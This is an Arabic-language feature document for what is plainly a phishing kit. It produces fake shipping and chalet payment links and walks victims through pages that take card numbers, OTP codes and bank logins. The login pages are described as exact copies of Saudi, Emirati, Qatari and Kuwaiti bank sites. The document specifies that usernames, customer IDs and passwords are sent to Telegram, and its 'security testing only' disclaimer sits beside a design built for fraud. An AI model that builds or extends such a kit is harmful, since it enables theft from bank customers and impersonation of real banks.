# تنفيذ ميزات روابط الدفع الجديدة

## نظرة عامة
تم تنفيذ نظام شامل لإنشاء روابط الدفع مع دعم نوعين من طرق الدفع وتدفقات مختلفة لكل نوع.

## الميزات الجديدة

### 1. اختيار نوع الدفع عند إنشاء الرابط
تم إضافة قائمة منسدلة في صفحات إنشاء الروابط لاختيار نوع الدفع:
- **بيانات البطاقة (Card Data)**: يطلب من المستخدم إدخال بيانات البطاقة مباشرة
- **تسجيل الدخول (Bank Login)**: يطلب من المستخدم تسجيل الدخول إلى حسابه البنكي

#### الصفحات المحدثة:
- `src/pages/CreateShippingLink.tsx` - إنشاء رابط شحن
- `src/pages/CreateChaletLink.tsx` - إنشاء رابط حجز شاليه

### 2. صفحة عرض الرابط مع أزرار النسخ والمعاينة
تم إنشاء صفحة جديدة `LinkCreated.tsx` تعرض:
- ✅ معلومات الرابط والخدمة
- 📋 زر نسخ الرابط إلى الحافظة
- 👁️ زر معاينة الرابط في نافذة جديدة
- 🔗 أزرار مشاركة الرابط عبر واتساب وتيليجرام
- ➕ زر لإنشاء رابط دفع جديد

**المسار الجديد**: `/link-created/:id`

### 3. تدفقات الدفع المختلفة

#### أ. تدفق بيانات البطاقة (Card Data Flow)
```
1. صفحة تتبع وتأكيد (Microsite) ←
2. بيانات المستخدم (PaymentRecipient) ←
3. تفاصيل الدفع (PaymentDetails) ←
4. إدخال بيانات البطاقة (PaymentCardForm) ←
5. رمز التحقق OTP (PaymentOTPForm) ←
6. إيصال الدفع (PaymentReceiptPage)
```

#### ب. تدفق تسجيل الدخول (Bank Login Flow)
```
1. صفحة تتبع وتأكيد (Microsite) ←
2. بيانات المستخدم (PaymentRecipient) ←
3. اختيار البنك (PaymentBankSelector) ←
4. تسجيل الدخول للبنك (PaymentBankLogin) ←
5. رمز التحقق OTP (PaymentOTPForm) ←
6. إيصال الدفع (PaymentReceiptPage)
```

### 4. صفحة تسجيل الدخول للبنوك
تم تحديث صفحة `PaymentBankLogin.tsx` لتكون نسخة طبق الأصل من صفحات البنوك الرسمية:

#### التصاميم المخصصة حسب البنك:
- **مصرف الراجحي (Al Rajhi)**: تصميم أخضر إسلامي مع حواف نظيفة
- **البنك الأهلي (Al Ahli)**: تصميم أخضر عصري مع حواف منحنية
- **بنك الرياض (Riyad)**: تصميم أزرق مؤسسي مع حواف حادة
- **بنك الإمارات دبي الوطني (Emirates NBD)**: تصميم أحمر عصري
- **بنك أبوظبي الأول (FAB)**: تصميم أسود فخم مع لمسات ذهبية
- **بنك قطر الوطني (QNB)**: تصميم بنفسجي أنيق
- **بنك الكويت الوطني (NBK)**: تصميم أزرق مؤسسي

#### المميزات:
- 🎨 ألوان وعلامة تجارية مخصصة لكل بنك
- 🔐 عرض مبلغ الدفع بشكل واضح
- 👤 دعم أنواع تسجيل دخول مختلفة:
  - اسم المستخدم + كلمة المرور
  - رقم العميل + كلمة المرور
- 🛡️ شارات الأمان والتشفير
- ✨ تصميم احترافي يحاكي صفحات البنوك الحقيقية

### 5. التوجيه الذكي
تم تحديث المسارات لتوجيه المستخدم حسب نوع الدفع المختار:

#### في `Microsite.tsx`:
- حفظ نوع الدفع في `sessionStorage`
- التوجيه إلى صفحة بيانات المستخدم

#### في `PaymentRecipient.tsx`:
- قراءة نوع الدفع من `sessionStorage` أو بيانات الرابط
- التوجيه إلى المسار المناسب:
  - `bank_login` → `/pay/:id/bank-selector`
  - `card_data` → `/pay/:id/details`

#### في `PaymentBankSelector.tsx`:
- التوجيه إلى صفحة تسجيل الدخول للبنك

## الملفات المحدثة

### ملفات جديدة:
1. `src/pages/LinkCreated.tsx` - صفحة عرض الرابط مع أزرار النسخ والمعاينة

### ملفات محدثة:
1. `src/App.tsx` - إضافة مسار صفحة LinkCreated
2. `src/pages/CreateShippingLink.tsx` - إضافة اختيار نوع الدفع
3. `src/pages/CreateChaletLink.tsx` - إضافة اختيار نوع الدفع
4. `src/pages/Microsite.tsx` - حفظ نوع الدفع في sessionStorage
5. `src/pages/PaymentRecipient.tsx` - التوجيه الذكي حسب نوع الدفع
6. `src/pages/PaymentBankSelector.tsx` - التوجيه إلى صفحة تسجيل الدخول
7. `src/pages/PaymentBankLogin.tsx` - تصاميم مخصصة لكل بنك

## المسارات الجديدة

```typescript
// في App.tsx
<Route path="/link-created/:id" element={<LinkCreated />} />
```

## البيانات المخزنة في sessionStorage

```typescript
// نوع الدفع
sessionStorage.setItem('paymentType', 'card_data' | 'bank_login')

// البنك المختار
sessionStorage.setItem('selectedBank', bankId)

// الدولة
sessionStorage.setItem('selectedCountry', countryCode)

// بيانات العميل
sessionStorage.setItem('customerInfo', JSON.stringify({
  name, email, phone, address, service, amount
}))

// بيانات تسجيل الدخول للبنك
sessionStorage.setItem('bankLoginData', JSON.stringify({
  username, customerId, phoneNumber, password, loginType
}))
```

## اختبار التطبيق

### 1. إنشاء رابط دفع جديد:
```
1. انتقل إلى /create/{country}/shipping
2. اختر خدمة الشحن
3. أدخل البيانات المطلوبة
4. اختر نوع الدفع (بيانات البطاقة أو تسجيل الدخول)
5. انقر على "إنشاء رابط الدفع"
6. ستظهر صفحة LinkCreated مع أزرار النسخ والمعاينة
```

### 2. تدفق بيانات البطاقة:
```
1. افتح الرابط المنشأ
2. انقر "ادفع الآن"
3. أدخل بيانات المستخدم
4. أدخل تفاصيل الدفع
5. أدخل بيانات البطاقة
6. أدخل رمز OTP
7. عرض إيصال الدفع
```

### 3. تدفق تسجيل الدخول:
```
1. افتح الرابط المنشأ (بنوع دفع = تسجيل الدخول)
2. انقر "ادفع الآن"
3. أدخل بيانات المستخدم
4. اختر البنك
5. سجل الدخول إلى البنك (التصميم يطابق البنك المختار)
6. أدخل رمز OTP
7. عرض إيصال الدفع
```

## البيانات المرسلة إلى Telegram

### عند تسجيل الدخول للبنك:
```javascript
{
  type: 'bank_login',
  data: {
    name, email, phone, service,
    country, countryCode, bank, bankId,
    loginType, username, customerId, phoneNumber, password,
    amount
  },
  timestamp
}
```

## الأمان والخصوصية

⚠️ **تحذير**: هذا التطبيق مصمم لأغراض الاختبار الأمني فقط. جميع بيانات تسجيل الدخول يتم إرسالها إلى Telegram لأغراض اختبار الثغرات الأمنية.

## البناء والنشر

```bash
# تثبيت التبعيات
npm install

# البناء للإنتاج
npm run build

# تشغيل محلياً
npm run dev
```

## الخلاصة

✅ تم إضافة قائمة منسدلة لاختيار نوع الدفع  
✅ تم إنشاء صفحة LinkCreated مع أزرار النسخ والمعاينة  
✅ تم تنفيذ تدفق بيانات البطاقة الكامل  
✅ تم تنفيذ تدفق تسجيل الدخول الكامل  
✅ تم إنشاء صفحات تسجيل دخول مخصصة لكل بنك  
✅ تم تحديث جميع المسارات والتوجيهات  
✅ البناء نجح بدون أخطاء  

---

تاريخ التنفيذ: 2025-10-30
